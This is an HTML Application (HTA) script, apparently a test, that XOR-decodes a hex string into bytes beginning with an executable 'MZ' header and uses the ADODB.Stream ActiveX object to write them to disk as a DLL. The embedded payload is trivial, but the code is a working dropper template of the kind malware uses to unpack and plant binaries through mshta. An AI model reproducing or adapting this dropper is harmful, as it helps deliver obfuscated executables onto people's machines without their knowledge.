<html>
<head>
<hta:application />

<script>

try {

    var hex = "3621eb7b78aa11ff";
    var key = 123;

    hex = hex.replace(/\s/g, "");

    var text = "";

    for (var i = 0; i < hex.length; i += 2) {

        var b = parseInt(hex.substr(i, 2), 16);

        if (isNaN(b)) continue;

        b = (b ^ key) & 0xFF;

        text += String.fromCharCode(b);
    }

    var stream = new ActiveXObject("ADODB.Stream");

    stream.Type = 2; // text
    stream.Charset = "iso-8859-1";
    stream.Open();

    stream.WriteText(text);

    stream.Position = 0;
    stream.Type = 1; // binary

    stream.SaveToFile("D:\\PYTHON\\C\\dll\\mshta\\mydll.dll", 2);

    stream.Close();

    alert("OK");

} catch(e) {

    alert(e.message);
}

</script>
</head>
<body></body>
</html>
